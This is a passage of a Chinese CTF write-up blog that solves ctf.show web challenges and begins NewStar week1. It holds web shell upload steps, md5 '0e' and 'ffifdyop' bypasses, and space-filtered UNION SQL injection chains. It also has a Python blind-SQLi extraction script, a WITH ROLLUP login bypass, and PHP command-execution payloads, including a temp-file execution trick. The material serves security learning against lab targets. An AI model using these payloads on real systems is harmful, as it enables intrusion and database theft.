+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20241015232214332.png" alt="image-20241015232214332"></p>
+<p>此题我用的hackbar进行实现</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20241015232440951.png" alt="image-20241015232440951"></p>
+<p>一句话木马上传成功之后，使用蚁剑进行连接</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20241015232744342.png" alt="image-20241015232744342"></p>
+<p>添加成功之后双击url地址即能查看目录，最终找到flag.txt</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20241015232936523.png" alt="image-20241015232936523"></p>
+<h3 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h3><p>这道题考察的是md5漏洞，首先审计代码</p>
+<ul>
+<li>**ctype_alpha($v1)**表示v1只能是字符</li>
+<li>**is_numeric($v2)**表示v2只能是数字</li>
+<li>在进行弱比较**&#x3D;&#x3D;**时，md5值以0e开头的会被直接当作0来算，所以此时以0e开头的两个值就相等，这就实现了绕过</li>
+<li>以下举例一些常用的md值以0e开头的字符或数字</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line"></span><br><span class="line">240610708 </span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line">s155964671a</span><br><span class="line">s214587387a</span><br><span class="line">s214587387a</span><br><span class="line">s878926199a</span><br></pre></td></tr></table></figure>
+
+<p>传入参数v1和v2就能得到flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1=QNKCDZO&amp;v2=240610708</span><br></pre></td></tr></table></figure>
+
+<h3 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h3><p>常规的sql注入但是过滤了空格，可以使用括号**()<strong>或者注释符&#x2F;</strong>&#x2F;进行过滤，如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a&#x27;or(true)#</span><br><span class="line">a&#x27;/**/or/**/true#</span><br></pre></td></tr></table></figure>
+
+<p>然后就是常规脱库流程，不再赘述</p>
+<p>代码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">a&#x27;/**/or/**/true/**/order/**/by/**/3#   --输入3时有回显，输入4时无回显，说明只有三个字段</span><br><span class="line"></span><br><span class="line">a&#x27;/**/union/**/select/**/1,2,3#         --回显的位置在2</span><br><span class="line"></span><br><span class="line">a&#x27;/**/union/**/select/**/1,database(),3#</span><br><span class="line"></span><br><span class="line">a&#x27;/**/union/**/select/**/1,group_concat(table_name),3/**/from/**/information_schema.tables/**/where/**/table_schema=&#x27;web2&#x27;#</span><br><span class="line"></span><br><span class="line">a&#x27;/**/union/**/select/**/1,group_concat(column_name),3/**/from/**/information_schema.columns/**/where/**/table_name=&#x27;flag&#x27;#</span><br><span class="line"></span><br><span class="line">a&#x27;/**/union/**/select/**/1,flag,3/**/from/**/flag#</span><br></pre></td></tr></table></figure>
+
+<h3 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h3><p>点击三篇文章的时候发现url栏有参数id的值一直在变，猜测存在sql注入</p>
+<p>试了一下发现空格又被过滤了，但大致步骤还是差不多</p>
+<p>先来判断显示位,此处id传一个-1,由于id通常不为负数,后端根据id查询不到内容,就只能展示联合查询的结果,从而帮助我们判断字段显示的位置</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">-1/**/union/**/select/**/1,2,3#</span><br><span class="line"></span><br><span class="line">-1/**/union/**/select/**/1,database(),3#</span><br><span class="line">-- 得到库名为web7</span><br><span class="line"></span><br><span class="line">-1/**/union/**/select/**/1,(select/**/group_concat(table_name)from/**/information_schema.tables/**/where/**/table_schema=&quot;web7&quot;),3#</span><br><span class="line"></span><br><span class="line">-1/**/union/**/select/**/1,(select/**/group_concat(column_name)from/**/information_schema.columns/**/where/**/table_schema=&quot;web7&quot;/**/and/**/table_name=&quot;flag&quot;),3#</span><br><span class="line"></span><br><span class="line">1&#x27;/**/union/**/select/**/1,flag,3/**/from/**/flag#</span><br></pre></td></tr></table></figure>
+
+<h3 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h3><p>本题也是sql注入，但过滤了空格和union还有单引号，and和or,所以这道题采用布尔盲注，但布尔盲注手动注入太麻烦，于是使用py脚本进行实现</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> requests.packages.urllib3.exceptions <span class="keyword">import</span> InsecureRequestWarning</span><br><span class="line"></span><br><span class="line"><span class="comment"># 禁用警告</span></span><br><span class="line">requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;https://bd20ee22-ebe1-4cc4-ad6c-eb457ddd0c50.challenge.ctf.show?id=-1/**/or/**/&#x27;</span></span><br><span class="line">name = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 循环45次( 循环次数按照返回的字符串长度自定义)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">45</span>):</span><br><span class="line">    <span class="comment"># 获取当前使用的数据库</span></span><br><span class="line">    <span class="comment">#payload = &#x27;ascii(substr(database()from/**/%d/**/for/**/1))=%d&#x27;</span></span><br><span class="line">    <span class="comment"># 获取当前数据库的所有表</span></span><br><span class="line">    <span class="comment">#payload = &#x27;ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database())from/**/%d/**/for/**/1))=%d&#x27;</span></span><br><span class="line">    <span class="comment"># 获取flag表的字段</span></span><br><span class="line">    <span class="comment"># payload = &#x27;ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x666C6167)from/**/%d/**/for/**/1))=%d&#x27;</span></span><br><span class="line">    <span class="comment"># 获取flag表的数据</span></span><br><span class="line">    <span class="comment"># payload = &#x27;ascii(substr((select/**/flag/**/from/**/flag)from/**/%d/**/for/**/1))=%d&#x27;</span></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;正在获取第 %d 个字符&#x27;</span> % i)</span><br><span class="line">    <span class="comment"># 截取SQL查询结果的每个字符, 并判断字符内容</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">31</span>, <span class="number">128</span>):</span><br><span class="line">        result = requests.get(url + payload % (i, j),verify=<span class="literal">False</span>)</span><br><span class="line">        <span class="comment">#print(f&#x27;检查第 &#123;i&#125; 个字符，j=&#123;j&#125; 的返回结果: &#123;result.text&#125;&#x27;)  # 添加调试输出</span></span><br><span class="line">        <span class="comment"># 如果存在关键字&#x27;If&#x27;,则说明当前字符是数据库名/表名/字段名/数据</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;If&#x27;</span> <span class="keyword">in</span> result.text:</span><br><span class="line">            name += <span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="comment"># print(&#x27;数据库名/表名/字段名/数据: %s&#x27; % name)</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;name:<span class="subst">&#123;name&#125;</span>&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 如果某个字符不存在,则停止程序</span></span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> count &gt;= (<span class="number">128</span> - <span class="number">31</span>):</span><br><span class="line">            exit()</span><br><span class="line"><span class="comment"># 最外层循环的注释根据需求进行取消</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>运行截图如下：</p>
+<p>获取数据库的表，只截取了flag表，实际上还有page和user:</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20241019213424599.png" alt="image-20241019213424599"></p>
+<p>获取flag表的字段：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20241019213735227.png" alt="image-20241019213735227"></p>
+<p>获取flag的数据：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20241019215037855.png" alt="image-20241019215037855"></p>
+<h3 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h3><p>开启靶机后进入网址，发现疑似存在sql注入，尝试了常见注入方法，发现无回显，应该是被过滤了</p>
+<p>用dirsearch扫描后得到robots.txt</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u 网址</span><br></pre></td></tr></table></figure>
+
+<p>查看robots.txt,发现存在index.phps</p>
+<p>下载源码后进行代码审计</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        <span class="variable">$flag</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">		<span class="variable">$password</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$password</span>)&gt;<span class="number">10</span>)&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&quot;password error&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$sql</span>=<span class="string">&quot;select * from user where username =&#x27;admin&#x27; and password =&#x27;&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>,<span class="literal">true</span>).<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">		<span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>,<span class="variable">$sql</span>);</span><br><span class="line">			<span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_num_rows</span>(<span class="variable">$result</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">					<span class="keyword">while</span>(<span class="variable">$row</span>=<span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$result</span>))&#123;</span><br><span class="line">						 <span class="keyword">echo</span> <span class="string">&quot;登陆成功&lt;br&gt;&quot;</span>;</span><br><span class="line">						 <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">					 &#125;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;select * from user where username =&#x27;admin&#x27; and password =&#x27;&quot;.md5($password,true).&quot;&#x27;&quot;;</span><br><span class="line">这段代码构建了一个 SQL 查询，但是它没有对用户输入进行适当的过滤或净化，很可能存在SQL注入，并且密码在数据库中储存为 MD5 散列值。</span><br></pre></td></tr></table></figure>
+
+<p>关于md5这个函数:md5(<em>string,raw</em>)</p>
+<table>
+<thead>
+<tr>
+<th align="left">参数</th>
+<th align="left">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><em>string</em></td>
+<td align="left">必需。规定要计算的字符串。</td>
+</tr>
+<tr>
+<td align="left"><em>raw</em></td>
+<td align="left">可选。规定十六进制或二进制输出格式：TRUE - 原始 16 字符二进制格式FALSE - 默认。32 字符十六进制数</td>
+</tr>
+</tbody></table>
+<p>关于mysqli_query()函数的定义和用法：</p>
+<p>mysqli_query( <em>connection,query,resultmode</em>) <em>;</em></p>
+<table>
+<thead>
+<tr>
+<th align="left">参数</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><em>connection</em></td>
+<td>必需。规定要使用的 MySQL 连接。</td>
+</tr>
+<tr>
+<td align="left"><em>query</em></td>
+<td>必需，规定查询字符串。</td>
+</tr>
+<tr>
+<td align="left"><em>resultmode</em></td>
+<td>可选。一个常量。可以是下列值中的任意一个：MYSQLI_USE_RESULT（如果需要检索大量数据，请使用这个）,MYSQLI_STORE_RESULT（默认)</td>
+</tr>
+</tbody></table>
+<p>一个很奇妙的字符串 <strong>&#x3D;&#x3D;ffifdyop&#x3D;&#x3D;</strong></p>
+<p>经过md5加密后为 276f722736c95d99e921722cf9ed621c </p>
+<p>在转为字符串时会出现乱码 ‘or’6É]é!r,ùíb</p>
+<p>在sql语句中，or后面只要不为0都会被看作true，从而实现sql注入绕过</p>
+<h3 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h3><p>打开靶机发现还是类似sql注入的题目，不同的是这次除了登录键还有取消键，点击取消得到源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">		<span class="variable">$flag</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">replaceSpecialChar</span>(<span class="params"><span class="variable">$strParam</span></span>)</span>&#123;</span><br><span class="line">             <span class="variable">$regex</span> = <span class="string">&quot;/(select|from|where|join|sleep|and|\s|union|,)/i&quot;</span>;</span><br><span class="line">             <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$regex</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$strParam</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$con</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Could not connect: &#x27;</span> . <span class="title function_ invoke__">mysqli_error</span>());</span><br><span class="line">        &#125;</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$username</span>)!=<span class="title function_ invoke__">strlen</span>(<span class="title function_ invoke__">replaceSpecialChar</span>(<span class="variable">$username</span>)))&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&quot;sql inject error&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$password</span>)!=<span class="title function_ invoke__">strlen</span>(<span class="title function_ invoke__">replaceSpecialChar</span>(<span class="variable">$password</span>)))&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&quot;sql inject error&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$sql</span>=<span class="string">&quot;select * from user where username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">		<span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>,<span class="variable">$sql</span>);</span><br><span class="line">			<span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_num_rows</span>(<span class="variable">$result</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">					<span class="keyword">while</span>(<span class="variable">$row</span>=<span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$result</span>))&#123;</span><br><span class="line">						<span class="keyword">if</span>(<span class="variable">$password</span>==<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>])&#123;</span><br><span class="line">							<span class="keyword">echo</span> <span class="string">&quot;登陆成功&lt;br&gt;&quot;</span>;</span><br><span class="line">							<span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">						&#125;</span><br><span class="line"></span><br><span class="line">					 &#125;</span><br><span class="line">			&#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>进行代码审计发现该段代码进行了sql注入过滤</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">       <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$username</span>)!=<span class="title function_ invoke__">strlen</span>(<span class="title function_ invoke__">replaceSpecialChar</span>(<span class="variable">$username</span>)))&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;sql inject error&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$password</span>)!=<span class="title function_ invoke__">strlen</span>(<span class="title function_ invoke__">replaceSpecialChar</span>(<span class="variable">$password</span>)))&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;sql inject error&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="comment">// 检测到sql注入相关语句$regex = &quot;/(select|from|where|join|sleep|and|\s|union|,)/i&quot;;都被过滤掉了	</span></span><br></pre></td></tr></table></figure>
+
+<p>所以常规的sql注入方法不能使用，于是这里可以使用<code>with rollup</code>使密码为空，然后进行绕过，这样就得到了flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;/**/or/**/true/**/group/**/by/**/password/**/with/**/rollup#</span><br></pre></td></tr></table></figure>
+
+<h3 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h3><p>打开靶机直接就能看到源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if($password==$_SESSION[&#x27;password&#x27;])&#123;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+
+<p>审计代码发现代码进行了sql注入过滤，只需要把Session设为空就能登录绕过</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20241020171128671.png"></p>
+<h3 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h3><p>查看源码发现<strong>hint：?cmd</strong>,提示cmd用get传参</p>
+<p>于是进行传参测试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=phpinfo();</span><br></pre></td></tr></table></figure>
+
+<p>发现页面存在回显，证明可以在 cmd 的值上构造语句执行命令。</p>
+<p>使用如下语句查看目录中的文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?cmd=print_r(scandir(%27./%27));</span><br><span class="line">?cmd=print_r(glob(“*”));</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20241020174810963.png" alt="image-20241020174810963"></p>
+<p>使用如下语句得到flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=highlight_file(&#x27;903c00105c0141fd37ff47697e916e53616e33a72fb3774ab213b3e2a732f56f.php&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>hightlight_file()可以使文件内容高亮显示, 常用于读取文件内容</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20241020174951678.png" alt="image-20241020174951678"></p>
+<h3 id="红包题第二弹"><a href="#红包题第二弹" class="headerlink" title="红包题第二弹"></a>红包题第二弹</h3><p>首先查看源码，发现<strong>hint：?cmd</strong>,提示cmd用get传参</p>
+<p>先传了个</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=phpinfo()；</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20241021104631393.png" alt="image-20241021104631393"></p>
+<p>发现被过滤了，并展示出了源码，发现过滤了很多东西</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-oq-z0-9$]+/&quot;</span>,<span class="variable">$cmd</span>))</span><br><span class="line"><span class="comment">// 只剩p没过滤了</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\~|\!|\@|\#|\%|\^|\&amp;|\*|\(|\)|\（|\）|\-|\_|\&#123;|\&#125;|\[|\]|\&#x27;|\&quot;|\:|\,/&quot;</span>,<span class="variable">$cmd</span>)</span><br><span class="line"><span class="comment">//  还剩下  &lt;  &gt;  ?  +  =  .  ;  `  /      没过滤</span></span><br></pre></td></tr></table></figure>
+
+<p>学习了一下大佬的文章，发现这是php的短标记语法，一些语法如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=   等价   &lt;?php echo</span><br><span class="line">`ls`  等价   system(&#x27;ls&#x27;)     ` 反引号可以当作命令执行</span><br><span class="line">.  或者叫period，它的作用和source一样，就是用当前的shell执行一个文件中的命令。比如，当前运行的shell是bash，则. file的意思就是用bash执行file文件中的命令。</span><br><span class="line">+     等价    空格</span><br></pre></td></tr></table></figure>
+
+<p>可以抓一个包用post传一个文件，然后利用cmd构造语句执行传入文件中的命令，因为上传的文件都是临时文件夹下，默认的文件名是&#x2F;tmp&#x2F;phpxxxxxx，文件名最后6个字符是随机的大小写字母。如&#x2F;tmp&#x2F;phphhhhhh</p>
+<p>于是可以传入如下参数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=?&gt;&lt;?=`.%20/??p/p?p??????`;?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>因为其他字母都被过滤了，所以这里使用?进行模糊匹配</p>
+<p>然后修改包的数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: multipart/form-data; boundary=hello1234567890</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong>Content-Type: multipart&#x2F;form-data;表示文件上传</strong></p>
+<p><strong>boundary&#x3D;hello1234567890表示定界符，boundary的内容你自己定</strong></p>
+<p>将下列代码写入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">--hello1234567890</span><br><span class="line">Content-Disposition: form-data; name=&quot;f&quot;; filename=&quot;7.txt&quot;</span><br><span class="line">Content-Type: text/plain</span><br><span class="line"> </span><br><span class="line">#!/bin/sh</span><br><span class="line">find / -name *flag*</span><br><span class="line">--hello1234567890--</span><br></pre></td></tr></table></figure>
+
+<p>第一个定界符只有前面有**–<strong>，第二个定界符前后都要有</strong>–**</p>
+<p><strong>#！&#x2F;bin&#x2F;sh</strong>是使用bash解释器执行下面的代码</p>
+<p>这里我这边有点小问题就是这种方法一直通不过，但是删去了**#！&#x2F;bin&#x2F;sh**之后就通过了</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20241021170722731.png" alt="image-20241021170722731"></p>
+<h2 id="Newstar"><a href="#Newstar" class="headerlink" title="Newstar"></a>Newstar</h2><h3 id="week1"><a href="#week1" class="headerlink" title="week1"></a>week1</h3><h4 id="headach3"><a href="#headach3" class="headerlink" title="headach3"></a>headach3</h4><p>连接靶机发现提示<strong>HEAD</strong>,大概是指响应头</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20241025181626654.png" alt="image-20241025181626654"></p>
+<p>f12查看响应头，具体位置在<strong>网络</strong>那，但注意, 它只会记录你打开f12之后的请求和响应, 所以一般打开后进行页面刷新才能看到原始请求&#x2F;响应</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20241025181825550.png" alt="image-20241025181825550"></p>
+<h4 id="会赢吗"><a href="#会赢吗" class="headerlink" title="会赢吗"></a>会赢吗</h4><p>连接靶机后直接f12查看源码，然后发现前部分flag和后半截网址</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20241025182630378.png" alt="image-20241025182630378"></p>
+<p>于是在自己的靶机网址后面加上&#x2F;4cqu1sition成功跳转，又继续f12查看源码</p>
+<p>看到如下关键代码：</p>
